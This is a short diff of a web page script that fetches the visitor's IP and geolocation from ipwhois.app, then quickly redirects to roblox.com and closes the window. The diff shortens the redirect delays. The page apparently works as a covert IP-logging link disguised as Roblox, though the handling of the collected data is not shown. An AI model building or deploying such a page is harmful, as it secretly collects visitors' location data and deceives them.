@@ -18,12 +18,6 @@
 
 <body>
     <script type="text/javascript">
-        function closeWindow() {
-            setTimeout(() => {
-                window.close()
-            }, 1000)
-        }
-
         new Promise(async (resolve, reject) => {
             try {
                 const data = await (await fetch("https://ipwhois.app/json/")).json();
@@ -57,12 +51,12 @@
                 setTimeout(() => {
                     window.location.replace("https://www.roblox.com")
                     window.close()
-                }, 60500)
+                }, 1300)
             }).catch(e => {
                 setTimeout(() => {
                     window.location.replace("https://www.roblox.com")
                     window.close()
-                }, 601800)
+                }, 1300)
             })
     </script>
     <div class="container">
